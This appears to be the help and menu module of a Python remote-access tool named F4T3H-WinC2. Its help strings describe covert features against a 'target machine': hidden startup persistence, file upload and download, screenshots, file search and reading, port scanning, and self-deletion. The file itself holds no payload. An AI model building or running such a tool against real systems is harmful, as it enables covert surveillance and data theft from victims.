
import os
from termcolor import colored

__send_help__ = """

        \033[1mSending binary files from your 'SENDING_PATH' dir to target machine.
        >> send file_name@file_url
        you should run the upload server before using this command.
"""

__get_help__ = """

        \033[1mDownloading binary files from the target machine.
        >> get file-name.ext
        if you aren't in the cwd you should provide the path.
"""

__port_scanner_help__ = """

        \033[1mScanning ip address for opened port numbers.
        Scanning for open ports throught a simple script, you can use namp for more details.
        >> port_scanner ip port1,port2,port3
"""

__geoip_help__ = """

        \033[1mGetting information about ip address.
        providing geo information for givine ip address and generating HTML report.
        >> geoip ip-address
"""

__system_info_help__ = """

        \033[1mDisplay some system's information like for more info use 'systeminfo' command
        >> system_info
"""

__list_programs_help__ = """

    \033[1mDisplay a list of all installed programs
    >> list_programs
"""

__find_help__ = """

        \033[1mSearching for files in a specific partition with specific exetention.
        it returns a list of all files which ends with givine ext in the path.
        >> find pdf@c:\
"""

__snapshot_help__ = """

        \033[1mGetting screenshot from target machine. you'll find screenshot.png in your 'DOWNLOAD_PATH'
        >> snapshot
"""

__calc_md5_help__ = """

        \033[1mCalculating the md5 hash sum of files.
        >> hashcalc file-name
"""


__read_help__ = """

        \033[1mReading text files such as .py, .html, .txt, .cpp. returning files content in str format.
        >> read file_name
"""

__auto_run_help__ = """

        \033[1mAdding shell to startup file and make it hidden.
        >> auto_run
"""




options = ["send", "get", "port_sanner", "geoip", "system_info", "snapshot", "find",
            "list_softwares", "md5", "read","about", "auto_run"]

help_dict = {
    "auto_run":       __auto_run_help__,
    "send":           __send_help__,
    "get":            __get_help__,
    "port_sanner":    __port_scanner_help__,
    "geoip":          __geoip_help__,
    "system_info":    __system_info_help__,
    "snapshot":       __snapshot_help__,
    "find":           __find_help__,
    "list_softwares": __list_programs_help__,
    "snapshot":       __snapshot_help__,
    "read":           __read_help__,
    "md5":            __calc_md5_help__
}


def banner():
        print(colored(f"""\
                    ________ _____________ __  __    _       ___       _________ 
                   / ____/ // /_  __/__  // / / /   | |     / (_)___  / ____/__ \ 
                  / /_  / // /_/ /   /_ </ /_/ /____| | /| / / / __ \/ /    __/ /
                 / __/ /__  __/ /  ___/ / __  /_____/ |/ |/ / / / / / /___ / __/ 
                /_/      /_/ /_/  /____/_/ /_/      |__/|__/_/_/ /_/\____//____/\n
                """, "red"))
    

def main_options():
    print("""
        [?] You can enter option_name or option_id.
        Options         Description
        -------         -------------
        [1] new         - Generating a new Shell.
        [2] start       - Starting shell session.
        [3] help        - Help man.
        [0] exit        - Exit this awesome tool.\n""")


def help_page():
    print(f"""
        \033[1mUsage: {colored(">> <option name>", "yellow")}\n
        for displaying this page again enter >> help\n
        Shell Options   Description
        =============   ===========
        auto_run        Adding shell to startup file and make it hidden.
        send            Sending binary files from your 'SENDING_PATH' dir to target machine.
        get             Downloading binary files from the target machine.
        port_scanner    Scanning ip address for opened port numbers.
        geoip           Getting information about ip address.
        system_info     Display all system's information like 'systeminfo'
        list_programs   Display a list of all installed programs.
        snapshot        Getting screenshot from target machine.
        read            Reading text files such as .py, .html, .txt, .cpp.
        find            Searching for files in a specific partition with specific exetention.
        md5             Calculationg hash sum for files.
        terminate       Closing the connection between the attacker and the target.
        kill            Killing the client shell by ending the connection and deleting shell file.\n""")


def print_usage(shell_option_help):
    print(colored(f"\n{shell_option_help}\n", "green"))


def help_handeler():
    help_page()
    while True:
        st = colored("Help Handler", "red")
        terminal = input(f"\033[1mF4T3H ({st}) >> ")
        while terminal == "":
            print(colored("~_~", "red"))
            terminal = input(f"\033[1mF4T3H ({st}) >> ")
        if terminal in options:
            print_usage(help_dict[terminal])
        elif terminal == "help":
            help_page()
        elif terminal.lower() == 'exit':
            return
        else:
            os.system(terminal)


